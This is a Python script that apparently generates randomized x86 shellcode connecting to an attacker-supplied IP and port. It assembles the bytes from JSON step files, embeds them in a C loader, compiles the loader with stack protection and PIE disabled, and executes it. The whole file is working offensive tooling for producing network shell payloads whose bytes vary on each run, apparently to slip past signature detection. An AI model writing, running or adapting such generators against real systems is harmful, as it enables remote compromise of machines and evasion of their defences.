import random
import sys
import json
from colorama import init, Fore, Style
import subprocess

init(autoreset=True)

shellcode = ""

if len(sys.argv) != 3:
    print(Fore.RED + "Invalid parameters. Use: python generator.py <IP> <PORT>")
    exit(1)
else:
    ipv4 = sys.argv[1]
    port = sys.argv[2]

def ip_to_hex(ip):
    if not all(1 <= int(byte) <= 255 for byte in ip.split('.')):
        print(Fore.RED + "Invalid IP. Use values (1-255).")
        exit(1)
    hex_parts = (format(int(byte), 'X').zfill(2) for byte in ip.split('.'))
    return ''.join(hex_parts)

def port_to_hex(port):
    port_hex = hex(int(port))[2:]
    if len(port_hex) % 2 != 0:
        port_hex = '0' + port_hex
    return port_hex

def format_shellcode(s):
    formatted_shellcode = 'X'
    formatted_shellcode += 'X'.join(a + b for a, b in zip(s[::2], s[1::2]))
    formatted_shellcode = formatted_shellcode.replace('X', '\\x')
    return formatted_shellcode

ipv4_hex = ip_to_hex(ipv4)
port_hex = port_to_hex(port)

with open('socket_creation_steps.json', 'r') as f:
    socket_creation_steps = json.load(f)

for step, options in socket_creation_steps.items():
    shellcode += random.choice(options)

with open('connection_steps.json', 'r') as f:
    connection_steps = json.load(f)

connection_steps["connection_socket_5"] = ["68" + ipv4_hex]  # push IP
connection_steps["connection_socket_6"] = ["6668" + port_hex]  # push port

for step, options in connection_steps.items():
    shellcode += random.choice(options)

formatted_shellcode = format_shellcode(shellcode)
print(Fore.CYAN + "Shellcode size: " + Fore.WHITE + str(len(shellcode)) + " bytes")
print("\n")
print(Fore.GREEN + "Generated Shellcode: \n")
print(Fore.YELLOW + formatted_shellcode + "\n")

c_program = f'''
#include <stdio.h>
#include <string.h>

int main(void) {{
    char code[] = "{formatted_shellcode}";
    int (*ret)() = (int(*)())code;
    ret();
}}
'''

with open('shellcode.c', 'w') as f:
    f.write(c_program)

compile_command = ['gcc', 'shellcode.c', '-w', '-fno-stack-protector', '-z', 'execstack', '-no-pie', '-o', 'shellcode.bin']
subprocess.run(compile_command)

subprocess.run(['./shellcode.bin'])
